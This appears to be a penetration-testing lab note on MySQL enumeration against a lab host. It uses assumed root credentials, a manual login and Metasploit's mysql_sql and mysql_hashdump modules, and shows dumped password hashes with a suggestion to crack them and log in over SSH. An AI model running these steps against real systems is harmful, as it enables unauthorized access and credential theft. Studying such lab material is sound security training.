## Pre-requisite --> [[enumeration]]

## MySQL enumeration practically:

we're going to assume that you found the **credentials: "root:password"** while enumerating subdomains of a web server.

### Requirements
```python
sudo apt install default-mysql-client
```

## Manual enumeration:
1. Scanning with nmap:
![[MySQL1.png]]

2. Manually connecting to MySQL server:
   ![[MySQL2.png]]
   We had used above credentials(root:password) for login purpose and now we exit from this session with "exit" command.

3. Finding the username with nmap script:
   ![[MySQL3.png]]


## Metasploit enumeration:
**Above two steps is same in this phase**

```python
msf6 > search mysql_sql
msf6 auxiliary(admin/mysql/mysql_sql) > options
msf6 auxiliary(admin/mysql/mysql_sql) > set RHOSTS 10.10.19.225
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD password
msf6 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.19.225

[*] 10.10.19.225:3306 - Sending statement: 'select version()'...
[*] 10.10.19.225:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
[*] Auxiliary module execution completed

```
**Result** - We get the version of database that is running on the server.

#### MySQL hashdump to find the username with hashes:
```python
msf6 auxiliary(scanner/mysql/mysql_schemadump) > use auxiliary/scanner/mysql/mysql_hashdump
msf6 auxiliary(scanner/mysql/mysql_hashdump) > options
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 10.10.19.225
RHOSTS => 10.10.19.225
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
msf6 auxiliary(scanner/mysql/mysql_hashdump) > run

[+] 10.10.19.225:3306     - Saving HashString as Loot: root:
[+] 10.10.19.225:3306     - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.19.225:3306     - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.19.225:3306     - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.19.225:3306     - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.19.225:3306     - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.19.225:3306     - Scanned 1 of 1 hosts (100% complete)

```
Now, we can crack the hash with john the ripper and login with ssh. 